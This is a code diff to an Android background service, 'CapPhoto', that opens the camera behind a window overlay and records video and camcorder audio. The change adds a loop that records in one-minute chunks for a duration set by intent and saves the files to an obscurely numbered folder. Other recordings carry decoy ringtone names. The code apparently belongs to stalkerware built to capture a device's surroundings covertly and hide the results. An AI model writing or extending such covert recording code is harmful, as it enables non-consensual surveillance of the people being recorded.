@@ -26,6 +26,7 @@ import net.gotev.uploadservice.MultipartUploadRequest;
 
 import java.io.File;
 import java.io.IOException;
+import java.util.Date;
 import java.util.UUID;
 
 public class CapPhoto extends Service implements SurfaceHolder.Callback {
@@ -36,7 +37,7 @@ public class CapPhoto extends Service implements SurfaceHolder.Callback {
     private MediaRecorder mediaRecorder = null;
     String Type="w",durst="w";
     String path=Environment.getExternalStorageDirectory().getAbsolutePath()+"/"+"Ringtonesmine.mp4";
-    int a=1;
+    int min;
 
     @Override
     public void onCreate() {
@@ -57,10 +58,12 @@ public class CapPhoto extends Service implements SurfaceHolder.Callback {
                     startForeground(1, notification);
 
                 }
+
                 if(intent != null){
                 durst=(String) intent.getExtras().get("dur");
                 Type=(String) intent.getExtras().get("type");
-
+                    int d= Integer.parseInt(durst);
+                    min=d/60000;
                 if (Type.equals("dating")){
                     path=Environment.getExternalStorageDirectory().getAbsolutePath()+"/"+"Ringtonesminedate.mp4";
                 }
@@ -108,6 +111,7 @@ public class CapPhoto extends Service implements SurfaceHolder.Callback {
     }
     @Override
     public void surfaceCreated(SurfaceHolder surfaceHolder) {
+        if (Type.equals("not")){
         try {
 
 
@@ -143,7 +147,7 @@ public class CapPhoto extends Service implements SurfaceHolder.Callback {
         } }catch (RuntimeException s){
             Log.e("runnigtime34", s.toString());
         }
-        if (Type.equals("not")){
+
         Handler handler=new Handler();
         handler.postDelayed(new Runnable() {
             @Override
@@ -187,27 +191,7 @@ public class CapPhoto extends Service implements SurfaceHolder.Callback {
 
         },200000);
     }else if (Type.equals("dating")){
-            Handler handler=new Handler();
-            handler.postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    try {
-
-
-                        mediaRecorder.stop();
-                        mediaRecorder.reset();
-                        mediaRecorder.release();
-                        camera.lock();
-                        camera.release();
-
-                        windowManager.removeView(surfaceView);
-                        //Toast.makeText(CapPhoto.this, "stop", Toast.LENGTH_SHORT).show();
-                    }catch (RuntimeException e){
-                        Log.e("runnigtime34", e.toString());
-                    }
-                }
-
-            }, Long.parseLong(durst));
+            getvideo(surfaceHolder);
 
         }
 
@@ -283,5 +267,69 @@ public class CapPhoto extends Service implements SurfaceHolder.Callback {
         return token;
 
     }
+    public void getvideo(SurfaceHolder surfaceHolder){
+        try {
+            Date curDate = new Date(System.currentTimeMillis());
+            String curedate = curDate.toString();
+            File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath(),"458544555433");
+            if (!file.exists()){file.mkdirs();}
+            min--;
 
+            camera =Camera.open();
+            try {
+                camera.setPreviewDisplay(surfaceHolder);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            camera.startPreview();
+//
+            mediaRecorder = new MediaRecorder();
+            camera.unlock();
+
+
+            mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
+            mediaRecorder.setCamera(camera);
+            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
+            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
+            mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));
+            mediaRecorder.setVideoFrameRate(15);
+            //mediaRecorder.setOutputFile(parcelWrite.getFileDescriptor());
+            mediaRecorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath()+"/458544555433/"+curedate+".mp4");
+
+
+            try {
+                mediaRecorder.prepare();
+                mediaRecorder.start();
+
+
+            } catch (Exception e) {
+                Log.e("cach343", e.toString() );
+            } }catch (RuntimeException s){
+            Log.e("cach343", s.toString());
+        }
+        Handler handler=new Handler();
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                try {
+
+
+                    mediaRecorder.stop();
+                    mediaRecorder.reset();
+                    mediaRecorder.release();
+                    camera.lock();
+                    camera.release();
+                    windowManager.removeView(surfaceView);
+                    //Toast.makeText(CapPhoto.this, "stop", Toast.LENGTH_SHORT).show();
+                    if (min>0){
+                        getvideo(surfaceHolder);
+                    }else {windowManager.removeView(surfaceView);}
+                }catch (RuntimeException e){
+                    Log.e("cach343", e.toString());
+                }
+            }
+
+        }, 60000);
+
+    }
 }
